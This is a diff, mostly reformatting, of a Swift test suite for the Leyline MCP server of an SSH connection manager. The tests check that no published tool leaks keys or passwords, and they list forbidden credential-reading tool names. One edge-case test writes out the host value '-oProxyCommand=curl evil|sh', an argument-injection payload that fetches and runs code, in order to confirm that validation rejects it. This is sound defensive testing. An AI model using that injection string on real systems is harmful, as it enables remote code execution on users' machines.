@@ -1,6 +1,7 @@
-import Testing
-import Foundation
 import AinkradAppKit
+import Foundation
+import Testing
+
 @testable import LeylineFeature
 
 // MARK: - harness
@@ -25,20 +26,25 @@ private let secretValues: [String] = [
 /// in-memory and `FakeSecrets` stands in for the host's Keychain-backed store,
 /// so nothing in this file can read or write a real credential.
 @MainActor
-private func makeFixture() -> (store: LeylineStore, secrets: FakeSecrets,
-                               keyConn: LeylineConnection, passwordConn: LeylineConnection,
-                               key: LeylineKey) {
+private func makeFixture() -> (
+    store: LeylineStore, secrets: FakeSecrets,
+    keyConn: LeylineConnection, passwordConn: LeylineConnection,
+    key: LeylineKey
+) {
     let secrets = FakeSecrets()
     let store = LeylineStore(documents: FakeDocs(), secrets: secrets)
-    let key = store.importKey(label: "Prod deploy key",
-                              privateKey: secretValues[0],
-                              passphrase: secretValues[1])
-    let keyConn = store.addConnection(label: "Prod web", host: "web.example.com", port: 2222,
-                                      username: "deploy", authMode: .key, keyID: key.id,
-                                      password: nil)
-    let passwordConn = store.addConnection(label: "Legacy box", host: "legacy.example.com",
-                                           port: 22, username: "root", authMode: .password,
-                                           keyID: nil, password: secretValues[2])
+    let key = store.importKey(
+        label: "Prod deploy key",
+        privateKey: secretValues[0],
+        passphrase: secretValues[1])
+    let keyConn = store.addConnection(
+        label: "Prod web", host: "web.example.com", port: 2222,
+        username: "deploy", authMode: .key, keyID: key.id,
+        password: nil)
+    let passwordConn = store.addConnection(
+        label: "Legacy box", host: "legacy.example.com",
+        port: 22, username: "root", authMode: .password,
+        keyID: nil, password: secretValues[2])
     return (store, secrets, keyConn, passwordConn, key)
 }
 
@@ -62,7 +68,8 @@ private final class FakeLauncher: PluginAppLauncher, PluginAppLauncherResult {
 
 @MainActor
 private func makeServer(store: LeylineStore, launcher: PluginAppLauncher)
-    -> (MCPAppServer, [String]) {
+    -> (MCPAppServer, [String])
+{
     let operations = LeylineMCPOperations(
         catalog: LeylineCatalog(store: store, launcher: launcher))
     return LeylineMCPServer.make(appID: "leyline", perform: { await operations.run($0) })
@@ -72,15 +79,18 @@ private func makeServer(store: LeylineStore, launcher: PluginAppLauncher)
 private func listedTools(_ server: MCPAppServer) async -> [[String: Any]] {
     let reply = await server.handle(#"{"jsonrpc":"2.0","id":1,"method":"tools/list"}"#)
     guard let data = reply.data(using: .utf8),
-          let root = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any],
-          let result = root["result"] as? [String: Any],
-          let tools = result["tools"] as? [[String: Any]] else { return [] }
+        let root = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any],
+        let result = root["result"] as? [String: Any],
+        let tools = result["tools"] as? [[String: Any]]
+    else { return [] }
     return tools
 }
 
 @MainActor
-private func call(_ server: MCPAppServer, _ name: String,
-                  _ arguments: [String: Any]) async -> (text: String, isError: Bool) {
+private func call(
+    _ server: MCPAppServer, _ name: String,
+    _ arguments: [String: Any]
+) async -> (text: String, isError: Bool) {
     let request: [String: Any] = [
         "jsonrpc": "2.0", "id": 7, "method": "tools/call",
         "params": ["name": name, "arguments": arguments],
@@ -88,9 +98,10 @@ private func call(_ server: MCPAppServer, _ name: String,
     let data = try! JSONSerialization.data(withJSONObject: request)
     let reply = await server.handle(String(decoding: data, as: UTF8.self))
     guard let replyData = reply.data(using: .utf8),
-          let root = (try? JSONSerialization.jsonObject(with: replyData)) as? [String: Any],
-          let result = root["result"] as? [String: Any],
-          let content = result["content"] as? [[String: Any]] else {
+        let root = (try? JSONSerialization.jsonObject(with: replyData)) as? [String: Any],
+        let result = root["result"] as? [String: Any],
+        let content = result["content"] as? [[String: Any]]
+    else {
         return ("<no result>", true)
     }
     return (content.first?["text"] as? String ?? "", result["isError"] as? Bool ?? false)
@@ -102,8 +113,9 @@ private func annotation(_ tool: [String: Any], _ key: String) -> Bool {
 
 // MARK: - THE credential test
 
-@Suite("Leyline MCP — no published tool can reach credential material",
-       .timeLimit(.minutes(1)))
+@Suite(
+    "Leyline MCP — no published tool can reach credential material",
+    .timeLimit(.minutes(1)))
 @MainActor
 struct LeylineMCPCredentialLeakTests {
 
@@ -157,9 +169,11 @@ struct LeylineMCPCredentialLeakTests {
         ]
         // …and the same set again with every launch failure the host can
         // report, because those take different text paths.
-        for outcome in [PluginLaunchOutcome.unknownApp("rune"),
-                        .disabled("rune"),
-                        .refused(reason: "bad payload")] {
+        for outcome in [
+            PluginLaunchOutcome.unknownApp("rune"),
+            .disabled("rune"),
+            .refused(reason: "bad payload"),
+        ] {
             launcher.outcome = outcome
             for (name, arguments) in calls where name == "connect" {
                 let reply = await call(server, name, arguments)
@@ -178,8 +192,9 @@ struct LeylineMCPCredentialLeakTests {
         // they are part of the surface and get the same assertion.
         for tool in await listedTools(server) {
             let encoded = (try? JSONSerialization.data(withJSONObject: tool)) ?? Data()
-            expectNoSecret(in: String(decoding: encoded, as: UTF8.self),
-                           tool: "tools/list", arguments: [:])
+            expectNoSecret(
+                in: String(decoding: encoded, as: UTF8.self),
+                tool: "tools/list", arguments: [:])
         }
 
         // The payload handed to Rune is a channel the model never sees, and
@@ -198,8 +213,10 @@ struct LeylineMCPCredentialLeakTests {
         var surface: [String] = []
         for (name, arguments) in calls { surface.append(await call(server, name, arguments).text) }
         for tool in await listedTools(server) {
-            surface.append(String(decoding: (try? JSONSerialization.data(withJSONObject: tool)) ?? Data(),
-                                  as: UTF8.self))
+            surface.append(
+                String(
+                    decoding: (try? JSONSerialization.data(withJSONObject: tool)) ?? Data(),
+                    as: UTF8.self))
         }
         for text in surface {
             for path in paths {
@@ -218,9 +235,11 @@ struct LeylineMCPCredentialLeakTests {
         #expect(names == ["list_connections", "list_keys", "connect"])
         // Named explicitly rather than by pattern: these are the exact
         // `LeylineStore` entry points that read or write secret material.
-        for forbidden in ["import_key", "set_password", "read_key", "get_password",
-                          "get_private_key", "add_connection", "update_connection",
-                          "remove_connection", "remove_key"] {
+        for forbidden in [
+            "import_key", "set_password", "read_key", "get_password",
+            "get_private_key", "add_connection", "update_connection",
+            "remove_connection", "remove_key",
+        ] {
             #expect(!names.contains(forbidden), "\(forbidden) must not be published")
         }
     }
@@ -239,8 +258,10 @@ struct LeylineMCPCredentialLeakTests {
         let (server, _) = makeServer(store: fixture.store, launcher: FakeLauncher())
         let published = Set(await listedTools(server).compactMap { $0["name"] as? String })
         #expect(published == ["list_connections", "list_keys", "connect"])
-        for forbidden in ["resolve_connection", "leyline.resolve_connection",
-                          "resolveConnection", "connection_info"] {
+        for forbidden in [
+            "resolve_connection", "leyline.resolve_connection",
+            "resolveConnection", "connection_info",
+        ] {
             #expect(!published.contains(forbidden), "\(forbidden) must not be published")
             #expect(!Set(LeylineMCPServer.tools.map(\.operation)).contains(forbidden))
             // Even naming the operation directly at the sink must not reach it.
@@ -273,19 +294,24 @@ struct LeylineMCPCredentialLeakTests {
         #expect(keys == "\(fixture.key.id.uuidString)  Prod deploy key")
     }
 
-    private func expectNoSecret(in text: String, tool: String, arguments: [String: Any],
-                                sourceLocation: SourceLocation = #_sourceLocation) {
-        #expect(!text.contains(secretMarker),
+    private func expectNoSecret(
+        in text: String, tool: String, arguments: [String: Any],
+        sourceLocation: SourceLocation = #_sourceLocation
+    ) {
+        #expect(
+            !text.contains(secretMarker),
+            "\(tool)\(arguments) leaked secret material: \(text)",
+            sourceLocation: sourceLocation)
+        for value in secretValues {
+            #expect(
+                !text.contains(value),
                 "\(tool)\(arguments) leaked secret material: \(text)",
                 sourceLocation: sourceLocation)
-        for value in secretValues {
-            #expect(!text.contains(value),
-                    "\(tool)\(arguments) leaked secret material: \(text)",
-                    sourceLocation: sourceLocation)
         }
-        #expect(!text.contains("BEGIN OPENSSH PRIVATE KEY"),
-                "\(tool)\(arguments) leaked a private key: \(text)",
-                sourceLocation: sourceLocation)
+        #expect(
+            !text.contains("BEGIN OPENSSH PRIVATE KEY"),
+            "\(tool)\(arguments) leaked a private key: \(text)",
+            sourceLocation: sourceLocation)
     }
 }
 
@@ -300,8 +326,9 @@ struct LeylineMCPServerTests {
         let fixture = makeFixture()
         let (server, failures) = makeServer(store: fixture.store, launcher: FakeLauncher())
         #expect(failures.isEmpty)
-        let tools = Dictionary(uniqueKeysWithValues: await listedTools(server)
-            .map { ($0["name"] as? String ?? "", $0) })
+        let tools = Dictionary(
+            uniqueKeysWithValues: await listedTools(server)
+                .map { ($0["name"] as? String ?? "", $0) })
         #expect(tools.count == 3)
 
         for name in ["list_connections", "list_keys"] {
@@ -362,8 +389,9 @@ struct LeylineMCPServerTests {
         // Permission denied. It now materializes exactly as the button does.
         let identity = try! #require(payload?.identityFile)
         #expect(identity.contains(fixture.key.id.uuidString))
-        #expect(SSHCommand.string(for: fixture.keyConn, identityFile: identity)
-            .contains("-i \(SSHCommand.shellQuote(identity))"))
+        #expect(
+            SSHCommand.string(for: fixture.keyConn, identityFile: identity)
+                .contains("-i \(SSHCommand.shellQuote(identity))"))
         // …and the file it points at is only readable by its owner.
         let mode = (try! FileManager.default.attributesOfItem(atPath: identity))[.posixPermissions] as? Int
         #expect(mode == 0o600)
@@ -390,8 +418,9 @@ struct LeylineMCPServerTests {
         let fixture = makeFixture()
         let launcher = FakeLauncher()
         let (server, _) = makeServer(store: fixture.store, launcher: launcher)
-        let lowered = await call(server, "connect",
-                                 ["connection": fixture.keyConn.id.uuidString.lowercased()])
+        let lowered = await call(
+            server, "connect",
+            ["connection": fixture.keyConn.id.uuidString.lowercased()])
         #expect(!lowered.isError)
         let byLabel = await call(server, "connect", ["connection": "PROD WEB"])
         #expect(!byLabel.isError)
@@ -409,9 +438,10 @@ struct LeylineMCPServerTests {
     func connectIdBeatsLabel() async {
         let fixture = makeFixture()
         let launcher = FakeLauncher()
-        _ = fixture.store.addConnection(label: fixture.keyConn.id.uuidString,
-                                        host: "decoy.example.com", port: 22, username: "root",
-                                        authMode: .key, keyID: fixture.key.id, password: nil)
+        _ = fixture.store.addConnection(
+            label: fixture.keyConn.id.uuidString,
+            host: "decoy.example.com", port: 22, username: "root",
+            authMode: .key, keyID: fixture.key.id, password: nil)
         let (server, _) = makeServer(store: fixture.store, launcher: launcher)
         let reply = await call(server, "connect", ["connection": fixture.keyConn.id.uuidString])
         #expect(!reply.isError)
@@ -422,9 +452,10 @@ struct LeylineMCPServerTests {
     func connectAmbiguousLabel() async {
         let fixture = makeFixture()
         let launcher = FakeLauncher()
-        _ = fixture.store.addConnection(label: "Prod web", host: "web2.example.com", port: 22,
-                                        username: "deploy", authMode: .key, keyID: fixture.key.id,
-                                        password: nil)
+        _ = fixture.store.addConnection(
+            label: "Prod web", host: "web2.example.com", port: 22,
+            username: "deploy", authMode: .key, keyID: fixture.key.id,
+            password: nil)
         let (server, _) = makeServer(store: fixture.store, launcher: launcher)
         let reply = await call(server, "connect", ["connection": "prod web"])
         #expect(reply.isError)
@@ -476,8 +507,9 @@ struct LeylineMCPEdgeCaseTests {
         ]
         for (outcome, fragment) in expectations {
             launcher.outcome = outcome
-            let reply = await call(server, "connect",
-                                   ["connection": fixture.keyConn.id.uuidString])
+            let reply = await call(
+                server, "connect",
+                ["connection": fixture.keyConn.id.uuidString])
             #expect(reply.isError)
             #expect(reply.text.contains(fragment), "got: \(reply.text)")
             // Every one of these names the connection, so the model can say
@@ -514,9 +546,10 @@ struct LeylineMCPEdgeCaseTests {
         // with a dash is code execution. `SSHLaunchPayload.validated()` closes
         // this for both repos; assert the MCP path actually calls it.
         let store = LeylineStore(documents: FakeDocs(), secrets: FakeSecrets())
-        let conn = store.addConnection(label: "Evil", host: "-oProxyCommand=curl evil|sh",
-                                       port: 22, username: "root", authMode: .password,
-                                       keyID: nil, password: nil)
+        let conn = store.addConnection(
+            label: "Evil", host: "-oProxyCommand=curl evil|sh",
+            port: 22, username: "root", authMode: .password,
+            keyID: nil, password: nil)
         let launcher = FakeLauncher()
         let (server, _) = makeServer(store: store, launcher: launcher)
         let reply = await call(server, "connect", ["connection": conn.id.uuidString])
@@ -561,8 +594,9 @@ struct LeylineMCPEdgeCaseTests {
             injects: [.init("force", .bool(true))])
         let allowed = await LeylineMCPServer.invoke(twin, arguments: "{}", perform: sink)
         #expect(!allowed.isError)
-        let object = (try? JSONSerialization.jsonObject(
-            with: Data(seen[0].utf8))) as? [String: Any]
+        let object =
+            (try? JSONSerialization.jsonObject(
+                with: Data(seen[0].utf8))) as? [String: Any]
         #expect(object?["force"] as? Bool == true)
         #expect(object?["operation"] as? String == "fixture")
     }
@@ -572,7 +606,10 @@ struct LeylineMCPEdgeCaseTests {
         var reached = false
         let result = await LeylineMCPServer.invoke(
             LeylineMCPServer.tools[0], arguments: "not json",
-            perform: { _ in reached = true; return AgentActionResult(text: "", isError: false) })
+            perform: { _ in
+                reached = true
+                return AgentActionResult(text: "", isError: false)
+            })
         #expect(result.isError)
         #expect(!reached)
     }
